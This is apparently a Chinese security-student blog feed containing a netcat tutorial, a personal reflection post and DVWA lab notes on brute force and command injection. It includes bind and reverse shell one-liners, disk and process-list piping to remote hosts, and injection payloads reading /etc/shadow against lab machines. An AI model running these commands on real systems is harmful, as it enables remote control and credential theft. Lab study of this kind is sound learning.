Truecrypt</p><p>应用程序—–&gt;报告工具库—–&gt;Documentation—–&gt;dradis</p><p>应用程序—–&gt;Office—–&gt;KeepNote</p><p>New Notebook</p><p>新建一个keepnote</p><p>TrueCrypt，是一款免费开源的加密软件，同时支持Windows Vista,7/XP, Mac OS X, Linux 等操作系统。TrueCrypt不需要生成任何文件即可在硬盘上建立虚拟磁盘，用户可以按照盘符进行访问，所有虚拟磁盘上的文件都被自动加密，需要通过密码来进行访问。TrueCrypt 提供多种加密算法，包括：AES-256, Blowfish (448-bit key), CAST5, Serpent, Triple DES, and Twofish，其他特性还有支持FAT32和NTFS分区、隐藏卷标、热键启动等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#kali渗透测试之Web渗透-工具-TCPDUMP&lt;/p&gt;
&lt;h2 id=&quot;TCPDUMP-抓包、筛选、高级筛选、过程文档记录&quot;&gt;&lt;a href=&quot;#TCPDUMP-抓包、筛选、高级筛选、过程文档记录&quot; class=&quot;headerlink&quot; title=&quot;TCPDUMP-
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="TCPDUMP" scheme="http://0xmj.club/tags/TCPDUMP/"/>
    
  </entry>
  
  <entry>
    <title>kali渗透测试之Web渗透-工具-NETCAT</title>
    <link href="http://0xmj.club/2018/02/27/kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BWeb%E6%B8%97%E9%80%8F-%E5%B7%A5%E5%85%B7-NETCAT/"/>
    <id>http://0xmj.club/2018/02/27/kali渗透测试之Web渗透-工具-NETCAT/</id>
    <published>2018-02-27T11:38:09.000Z</published>
    <updated>2018-02-27T11:44:10.425Z</updated>
    
    <content type="html"><![CDATA[<p>#kali渗透测试之Web渗透-工具-NETCAT</p><p>##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)<br>网络工具中的瑞士军刀——小身材、大智慧<br>侦听模式/传输模式<br>telnet/获取banner信息<br>传输文本信息<br>传输文件目录<br>加密传输文件<br>远程控制/木马<br>加密所有流量<br>流媒体服务器<br>远程克隆硬盘</p><h3 id="NC—–TELNET-banner"><a href="#NC—–TELNET-banner" class="headerlink" title="NC—–TELNET/banner"></a>NC—–TELNET/banner</h3><p>nc -nv 1.1.1.1 10<br>nc -nv 1.1.1.1 25<br>nc -nv 1.1.1.1 80<br>root:~# nc -h               //它的基本用法<br> root:~# nc -v               //端口扫描<br>root:~# mtr 200.106.0.20    //追踪一下路由<br>root:~# nc -vn              //显示详细的终端信息，不会Dns解析<br>root:~# ping pop3. 163.com<br>//连接ip邮箱（客户端链接服务器端）<br>root:~# nc -vn 123.125.50.29 110<br>USER<br>USER 12asdfg<br>USER ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==</p><p>root:~# base64<br>fanghong.yuan@163.com<br>（按ctrl+d邮箱编码成：ZmfuZZhvbmcueXVhbkAxNjMuY29tCg==）</p><p>root:~# ping smtp.163.com</p><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6fanghong.yuan@163.com535 Error: authentication failed</code></pre><p>root:~# nc -nv 123.125.20.138 25</p><pre><code>220 163.com Anti-spam GT for Coremail System(163com[20141201])ehlo500 Errot: bad syntaxehlo yuanfh250-mail250-PIPELINING250-AUTH LOGIN PLAIN250-AUTH=LOGIN PLAIN250-coremail 1uxr2xKj7G0xkI17xGrU710s8FY2U3Uj8Cz8x1UUUUU7Ic2IOY2Urz03NIUCa0xDrUUUUj250-ARARTTLS250 8BIMIMEAUTH LOGIN344 dxNLcm5hbWU6&lt;fanghong.yuan@163.com&gt;535 Error: authentication failed</code></pre><p>root:~# nc -nv 10.1.1.11 80</p><pre><code>(UNKNOWN) [10.1.1.11] 80 (http) openhead /&lt;html&gt;&lt;head&gt;&lt;titile&gt;Metasploitable2 - Linux&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;pre&gt;warning: Never expose this VM to an untrusted network!Contact: msfdev[at]metasploit.comLogin with msfadmin/msfadmin to get started&lt;/pre&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;/twiki/&quot;&gt;Twiki&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/phpMyAdmin/&quot;&gt;phpMyAdmin&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/mutillidae/&quot;&gt;Mutillidae&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dvwa/&quot;&gt;DVWA&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;/dav/&quot;&gt;wevDAV&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><h3 id="NC—–传输文本信息"><a href="#NC—–传输文本信息" class="headerlink" title="NC—–传输文本信息"></a>NC—–传输文本信息</h3><p>A: nc -l -p 4444</p><p>B: nc -nv 1.1.1.1 4444</p><p>远程电子取证信息收集</p><p>开启两台系统kalix64和kalix32</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333       //打开端口333</p><p>root@kali:~# netstat -pantu | grep 333     //查看端口33是否打开<br>ifconfig查看地址：10.1.1.12<br>kali 64Bit</p><p>root:~# nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open<br><img src="http://oy0tigw51.bkt.clouddn.com/201802271914_628.png" alt=""><br>然后两台电脑实现聊天的功能！</p><h3 id="远程电子取证"><a href="#远程电子取证" class="headerlink" title="远程电子取证"></a>远程电子取证</h3><p>kali 32Bit</p><p>root@kali:~# nnc -l -p 333       //打开端口333</p><p>kali 64Bit</p><p>root:~# ls -l | nc -nv 10.1.1.12 333</p><p>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>root:~# ps aux              //查看可疑的进程</p><p>kali 32Bit</p><p>root@kali:~# nc -l -p 333 &gt; ps.txt   监听333端口有信息重定向到ps.txt文件里</p><p>kali 64Bit<br>root:~# ps aux | nc -nv 10.1.1.12 333 -q 1<br>(UNKNOWN) [10.1.1.12] 333 (?) open</p><p>kali 32Bit<br>root@kali:~# cat ps.txt         //查看ps.txt文件<br>kali 32Bit<br>root@kali:~# nc -l -p 333 &gt; lsof.txt</p><p>kali 64Bit</p><p>root:~# lsof | nc -nv 10.1.1.12 333 -q 1</p><p>(UNKNOWN) [10.1.1.12] 333 (?)  open</p><p>kali 32Bit</p><p>root@kali:~# more lsof.txt    //这个文件比较多，所以用more查看文件</p><h3 id="NC—-传输文件-目录"><a href="#NC—-传输文件-目录" class="headerlink" title="NC—-传输文件/目录"></a>NC—-传输文件/目录</h3><p>传输文件</p><pre><code>A: nc -lp 333 &gt; 1.mp4 侦听此端口 接受文件B: nc -nv 1.1.1.1. 333 &lt; 1.mp4 - q 1 发送到A的计算机 只连接一秒或A: nc -q -lp 333 &lt; a.mp4 把视频文件放到333侦听端口 发送B: nc -nv 1.1.1.1 333 &gt; 2.mp4 客户端链接的得到文件</code></pre><p>传输目录</p><pre><code>A: tar -cvf - music/ | nc -lp 333 - q 1B: nc -nv 1.1.1.1 333 | tar -xvf -</code></pre><p>加密传文件</p><pre><code>A: nc -lp 333 | mcrypt --flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4          文件解密B:  mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1     文件加密</code></pre><p>A:</p><p>root:~/Desktop# nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4 </p><p>Enter passphrase: xxxx </p><p>B:</p><p>root:~/Desktop# mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p><p>Enter the passphrase (maximum of 512 characters)</p><p>Please use a combination of upper and lower case letters and numbers.</p><p>Enter passhrase: (UNKNOWN) [10.1.1.12] 333 (?) open</p><p>en</p><p>Enter passphrase: xxxx</p><p>NC不自带mcrypt,需要自己安装！</p><h3 id="NC—–流媒体服务"><a href="#NC—–流媒体服务" class="headerlink" title="NC—–流媒体服务"></a>NC—–流媒体服务</h3><pre><code>A: cat 1.mp4 | nc -lp 333B: nc -nv 1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</code></pre><h3 id="NC—–端口扫描"><a href="#NC—–端口扫描" class="headerlink" title="NC—–端口扫描"></a>NC—–端口扫描</h3><p>  nc -nvz 1.1.1.1 -65536</p><p>  nc -vnzu 1.1.1.1 1-1024</p><p>root@1kali:~# nc -h</p><p>[v1.10-38]</p><p>connect to somewhere:   nc [-options] hostname port[s] [ports] … </p><p>listen for inbound: nc -l -p port [-options] [hostname] [port]</p><p>options:</p><pre><code>-c shell commands   as `-e&#39;; use /bin/sh to exec [dangerous!!]-e filename     program to exec after connect [dangerous!!]-b          allow broadcasts-g gateway      source-routing hop point[s], up to 8                          设置路由器跃程通信网关，最高可设置8个。-G num          source-routing pointer: 4, 8, 12, ...                         设置来源路由指向器，其数值为4的倍数。-h          this cruft -i secs         delay interval for lines sent, ports sca                      延时的间隔    -k                      set keepalive option on socket-l          listen mode, for inbound connects                             监听模式,入站连接-n          numeric-only IP addresses, no DNS                             直接使用ip地址,而不用域名服务器-o file         hex dump of traffic                                           指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。-p port         local port number                                             本地端口-r          randomize local and remote ports                              随机本地和远程端口 -q secs         quit after EOF on stdin and delay of secs-s addr         local source address  -T tos          set Type Of Service-t          answer TELNET negotiation   -u          UDP mode                                                      udp  模式-v          verbose [use twice to be more verbose]                        显示过程,vv 更多-w secs         timeout for connects and final net reads                      等待连接超时-z          zero-I/O mode [used for scanning]                             使用输入/输出模式，只在扫描通信端口时使用。</code></pre><h3 id="NC—–远程克隆硬盘"><a href="#NC—–远程克隆硬盘" class="headerlink" title="NC—–远程克隆硬盘"></a>NC—–远程克隆硬盘</h3><pre><code> A: nc -lp 333 | dd of=/dev/sda B: dd if=/dev/sda | nc -nv 1.1.1.1 333 -q 1</code></pre><p>远程电子取证，可以讲目标服务器远程复制，或者内存。</p><h3 id="NC—–远程控制"><a href="#NC—–远程控制" class="headerlink" title="NC—–远程控制"></a>NC—–远程控制</h3><p>正向：</p><pre><code>A: nc  -lp 333 -  bashB: nc  1.1.1.1 333</code></pre><p>反向：</p><pre><code>A: nc -nv 1.1.1.1 333B: nc -lp 333 -c bash</code></pre><p>注：Windows用户把bash改成cmd;</p><p>root@kali:~# ifconfig</p><p>eth0      Link encap:Ethernet  HWaddr 00:0c:29:c6:89:56  </p><pre><code>      inet addr:192.168.198.130  Bcast:192.168.198.255  Mask:255.255.255.0      inet6 addr: fe80::20c:29ff:fec6:8956/64 Scope:Link      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1      RX packets:46 errors:0 dropped:0 overruns:0 frame:0      TX packets:49 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:1000       RX bytes:6770 (6.6 KiB)  TX bytes:8161 (7.9 KiB)      Interrupt:19 Base address:0x2000 </code></pre><p>lo        Link encap:Local Loopback  </p><pre><code>      inet addr:127.0.0.1  Mask:255.0.0.0      inet6 addr: ::1/128 Scope:Host      UP LOOPBACK RUNNING  MTU:65536  Metric:1      RX packets:20 errors:0 dropped:0 overruns:0 frame:0      TX packets:20 errors:0 dropped:0 overruns:0 carrier:0      collisions:0 txqueuelen:0       RX bytes:1200 (1.1 KiB)  TX bytes:1200 (1.1 KiB)</code></pre><p>A:</p><p>root@kali:~# nc -nv 192.168.1.115 333 -c bash </p><p>(UNKNOWN) [192.168.1.115] 333 (?) open</p><p>ls </p><p>pwd</p><p>没有任何反应</p><p>B:</p><p>root:~# nc -lp 333</p><p>ls</p><p>Desktop</p><p>/root</p><p>ifconfig</p><p>……(一串文字）</p><p>请求来控制我！</p><p>NC—–NCAT</p><p>  Nc缺乏就加密和身份验证的能力</p><p>  Ncat包含于nmap工具包中</p><p>  A: ncat -c bash –allow 192.168.20.14 -vnl 333 –ssl</p><p>  B: ncat -nv 1.1.1.1 333 –ssl</p><p>不同系统/平台的nc参数功能不尽相同</p><p>root:~# man nc</p><p>root:~# nc -h</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#kali渗透测试之Web渗透-工具-NETCAT&lt;/p&gt;
&lt;p&gt;##NETCAT(传输文件/目录、流媒体服务、端口扫描、远程克隆硬盘)&lt;br&gt;网络工具中的瑞士军刀——小身材、大智慧&lt;br&gt;侦听模式/传输模式&lt;br&gt;telnet/获取banner信息&lt;br&gt;传输文本信息&lt;b
      
    
    </summary>
    
      <category term="Kali" scheme="http://0xmj.club/categories/Kali/"/>
    
    
      <category term="NETCAT" scheme="http://0xmj.club/tags/NETCAT/"/>
    
  </entry>
  
  <entry>
    <title>17-11反思与进取</title>
    <link href="http://0xmj.club/2017/11/22/17-11%E5%8F%8D%E6%80%9D%E4%B8%8E%E8%BF%9B%E5%8F%96/"/>
    <id>http://0xmj.club/2017/11/22/17-11反思与进取/</id>
    <published>2017-11-22T09:10:55.000Z</published>
    <updated>2017-11-22T09:15:35.278Z</updated>
    
    <content type="html"><![CDATA[<p>#反思与进取<br><img src="http://oy0tigw51.bkt.clouddn.com/201711202038_238.png" alt=""><br>很久没这么静下心来去反思，自身的问题越来越多，活的越来越混沌，方向感越来越不是自己的，外界的影响往往大于自身的抉择。</p><p>从5月份开始忙着转专业到现在转入信安专业，我也都没忘记自己高考报名这所学校的初衷，也如愿的进入自己理想的状态， 期间太过于迷茫， 总是怀疑自己到底可不可以，如果放弃每天都可以打打游戏，谈谈恋爱，扯扯不知所云的理想，这多舒服啊，但我也总觉得有人告诉我，“你如果每天都很难受，那么你每天都会成长，当你回过头来发现，你必定会恍然大悟自己的难受是有多么值得。”<br>人总是犯贱和懒惰的， 灌了鸡汤，不过打一个短暂的兴奋剂，过了几天，还是精虫上脑，活如死尸。<br>舒服了太久，不知道自己有多差劲。<br>这半年也眨眼即逝，从开学到现在也忙于进入三叶草小组，也卓有成效，靠着脸皮与努力如愿进入小组，但这几天自己高兴过头不知道自己其实还差太远，万万不可得意忘形。这话也是我的girlfriend在我们吃庆功宴的时候告诉我的警告。<br>每每觉得自己可以接近完工的时候，我心里总会告诉我自己休息一会儿，马上就好了。然后浪费很多时间，而距离真正的完成却差距很多。从而再次理思路，完成这期间花费的时间往往是巨大的。</p><p>大概看了彭哥的博客感触越发深刻，这一年的多的时间里自己真正想要的总会偏移正轨。<br>这一年的懒惰心里尤为可怕，凡事为自己查找借口，凡事为自己解脱多容易啊，不懂装懂多好啊，别人会觉得你多厉害多聪明啊。<br>这些人性的弱点往往在自身的思考之后越发觉得厌恶。</p><p>或许是时候做些改变。<br>或许苦味的生活才是该拥抱的。<br>或许应当用力量固执地强迫自己向前去奋斗，到力尽气竭为止。</p><p>脸上有阳光，脑子里有爱情，灵魂里有进取，这大概是我现在最想要追寻的。</p><p>接下来的生活真的需要不竭的动力去执行<br>我需要做到：<br>1.找回自身的最好的状态，不睡懒觉，不找借口，做最好的自己<br>2.每周连载2篇博客<br>3.学习成绩年级top20，过六级，每两日一份试卷<br>4.认真听取每节课，不浪费一分一秒<br>5.寒假结束之前将安全牛web安全工程师所有内容学完<br>6.下学期进入核心组</p><p>佛曰：精进。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;#反思与进取&lt;br&gt;&lt;img src=&quot;http://oy0tigw51.bkt.clouddn.com/201711202038_238.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;很久没这么静下心来去反思，自身的问题越来越多，活的越来越混沌，方向感越来越不是自己的，外界的影响往往大
      
    
    </summary>
    
      <category term="思考" scheme="http://0xmj.club/categories/%E6%80%9D%E8%80%83/"/>
    
    
      <category term="思考" scheme="http://0xmj.club/tags/%E6%80%9D%E8%80%83/"/>
    
  </entry>
  
  <entry>
    <title>DVWA笔记</title>
    <link href="http://0xmj.club/2017/11/22/DVWA%E7%AC%94%E8%AE%B0/"/>
    <id>http://0xmj.club/2017/11/22/DVWA笔记/</id>
    <published>2017-11-22T09:06:26.000Z</published>
    <updated>2017-11-22T09:15:00.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA笔记"><a href="#DVWA笔记" class="headerlink" title="DVWA笔记"></a>DVWA笔记</h1><h3 id="一：搭建平台"><a href="#一：搭建平台" class="headerlink" title="一：搭建平台"></a>一：搭建平台</h3><p> <img src="http://oy0tigw51.bkt.clouddn.com/201710232230_351.png" alt=""></p><p> <img src="http://oy0tigw51.bkt.clouddn.com/201710240131_802.png" alt="中文图"></p><hr><h3 id="二-Brute-Force"><a href="#二-Brute-Force" class="headerlink" title="二: Brute Force"></a>二: Brute Force</h3><p>Low:</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Get username $user = $_GET[ &#39;username&#39; ]; // Get password $pass = $_GET[ &#39;password&#39; ]; $pass = md5( $pass ); // Check the database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>参数username、password没有做任何过滤，存在明显的sql注入漏洞。<br>在Login中输入用户名与密码<br>用burpsuite进行拦截<br><img src="http://oy0tigw51.bkt.clouddn.com/201710232240_813.png" alt=""></p><p>将表单进行提交到intruder模块，在password参数的内容两边加$，并将password设置为破解的payload<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240053_146.png" alt=""></p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710240056_540.png" alt=""><br>尝试在爆破结果中找到正确的密码，可以看到password的响应包长度（length）“与众不同”，可推测password为正确密码，手工验证登陆成功。</p><p><img src="http://oy0tigw51.bkt.clouddn.com/201710240109_245.png" alt=""></p><p>Medium：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check the database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;; $result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( 2 ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } ?&gt;</code></pre><p>相比Low级别的代码，Medium级别的代码主要增加了mysql_real_escape_string函数，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，基本上能够抵御sql注入攻击(MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义)；同时，$pass做了MD5校验，杜绝了通过参数password进行sql注入的可能性。但是，源代码中只是添加了sleep函数，依然没有加入有效的防暴机制。</p><p>查看源码发现</p><p>sleep( 2 ); </p><pre><code>1</code></pre><p>测试不成功时会延时2s，方法和low一样，只是慢一些，需要更新cookie中的安全等级security。</p><pre><code>headers = {    &#39;Cookie&#39;: &#39;PHPSESSID=h6r8555q2obvo388r4u50lg397; security=medium&#39;}</code></pre><p>High：</p><pre><code>&lt;?php if( isset( $_GET[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_GET[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_GET[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Check database $query  = &quot;SELECT * FROM `users` WHERE user = &#39;$user&#39; AND password = &#39;$pass&#39;;&quot;;$result = mysql_query( $query ) or die( &#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; ); if( $result &amp;&amp; mysql_num_rows( $result ) == 1 ) { // Get users details $avatar = mysql_result( $result, 0, &quot;avatar&quot; ); // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area {$user}&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;; } mysql_close(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt; </code></pre><p>通过checkToken( $_REQUEST[ ‘user_token’ ], $_SESSION[ ‘session_token’ ], ‘index.php’ );加入token和generateSessionToken();加入Anti-CSRFtoken预防无脑爆破，所以我们不可以再使用burpsuite工具进行无脑爆破了。而且 mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。<br>还是可以去进行暴力破解，这个就需要python脚本来完成了。通过浏览器访问，打开F12进行查看，我们会发现每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。同时，我们可以看到user_token在源代码中可以获取到的。所以我们需要写一个爬虫来获取页面中的user_token的值。</p><p>Impossible：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Login&#39; ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; ); // Sanitise username input $user = $_POST[ &#39;username&#39; ]; $user = stripslashes( $user ); $user = mysql_real_escape_string( $user ); // Sanitise password input $pass = $_POST[ &#39;password&#39; ]; $pass = stripslashes( $pass ); $pass = mysql_real_escape_string( $pass ); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time   = 15; $account_locked = false; // Check the database (Check user information) $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Check to see if the user has been locked out. if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  { // User locked out.  Note, using this method would allow for user enumeration! //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;; // Calculate when the user would be allowed to login again $last_login = $row[ &#39;last_login&#39; ]; $last_login = strtotime( $last_login ); $timeout= strtotime( &quot;{$last_login} +{$lockout_time} minutes&quot; ); $timenow= strtotime( &quot;now&quot; ); // Check to see if enough time has passed, if it hasn&#39;t locked the account if( $timenow &gt; $timeout ) $account_locked = true; } // Check the database (if username matches the password) $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR); $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR ); $data-&gt;execute(); $row = $data-&gt;fetch(); // If its a valid login... if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) { // Get users details $avatar   = $row[ &#39;avatar&#39; ]; $failed_login = $row[ &#39;failed_login&#39; ]; $last_login   = $row[ &#39;last_login&#39; ]; // Login successful echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;{$user}&lt;/em&gt;&lt;/p&gt;&quot;; echo &quot;&lt;img src=\&quot;{$avatar}\&quot; /&gt;&quot;; // Had the account been locked out since last login? if( $failed_login &gt;= $total_failed_login ) { echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;{$failed_login}&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;${last_login}&lt;/em&gt;.&lt;/p&gt;&quot;; } // Reset bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in {$lockout_time} minutes&lt;/em&gt;.&lt;/pre&gt;&quot;; // Update bad login count $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );$data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Set the last login time $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; ); $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR ); $data-&gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?&gt;</code></pre><p>Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。菜鸡发抖</p><hr><h3 id="三-Command-Injection"><a href="#三-Command-Injection" class="headerlink" title="三:Command Injection"></a>三:Command Injection</h3><p>命令注入漏洞是特别危险的，因为它们允许未经授权的执行操作系统命令， 它们的存在，因为应用程序无法正确地验证和消毒，使用时调用shell的功能，如的参数。 攻击者与控制这些参数可以欺骗应用程序执行任何系统命令自己的选择。为了正确测试命令注入漏洞，应遵循以下步骤：</p><ol><li>§ 第1步： 了解攻击场景</li><li>§ 第2步： 分析原因及对策</li><li>§ 第3步： 开始试验和探索</li><li><p>§ 第4步： 微调测试案例</p><p>命令注入攻击的常见模式为：仅仅需要输入数据的场合，却伴随着数据同时输入了恶意代码，而装载数据的系统对此并未设计良好的过滤过程，导致恶意代码也一并执行，最终导致信息泄露或者正常数据的破坏。<br>PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。</p></li></ol><pre><code>&lt;?php   if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {   // Get input   $target = $_REQUEST[ &#39;ip&#39; ];   // Determine OS and execute the ping command.   if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {   // Windows   $cmd = shell_exec( &#39;ping  &#39; . $target );   }   else {   // *nix   $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );   }   // Feedback for the end user   echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;   }   ?&gt;</code></pre><p>$target = $_REQUEST[ ‘ip’ ];直接从文本框中输入的内容，没有任何限制，刚刚我们在上面也看到了，在操作系统中使用“&amp;&amp;”连接符（在windows下一个&amp;和两个&amp;都可以，在linux下一定要两个），可以执行多条命令。</p><p>如果输入的值不是一个简单的IP，而是127.0.0.1&amp;&amp;net user，那么可以看到返回值里就把系统的用户名拿到了，<br><img src="http://oy0tigw51.bkt.clouddn.com/201710240138_810.png" alt=""></p><p>还可以注意ping <a href="http://www.baidu.com.cn" target="_blank" rel="external">http://www.baidu.com.cn</a> || net user的写法，这句话的意思是如果||的前面命令执行失败则执行||后面的命令。<br>Linux下输入127.0.0.1&amp;&amp;cat /etc/shadow甚至可以读取shadow文件，可见危害之大。</p><p>Medium：</p><pre><code>&lt;?php if( isset( $_POST[ &#39;Submit&#39; ]  ) ) { // Get input $target = $_REQUEST[ &#39;ip&#39; ]; // Set blacklist $substitutions = array( &#39;&amp;&amp;&#39; =&gt; &#39;&#39;, &#39;;&#39;  =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) { // Windows $cmd = shell_exec( &#39;ping  &#39; . $target ); } else { // *nix $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target ); } // Feedback for the end user echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; } ?&gt;</code></pre><blockquote><p>// Set blacklist </p></blockquote><pre><code>$substitutions = array(     &#39;&amp;&amp;&#39; =&gt; &#39;&#39;,     &#39;;&#39;  =&gt; &#39;&#39;, ); // Remove any of the charactars in the array (blacklist). $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 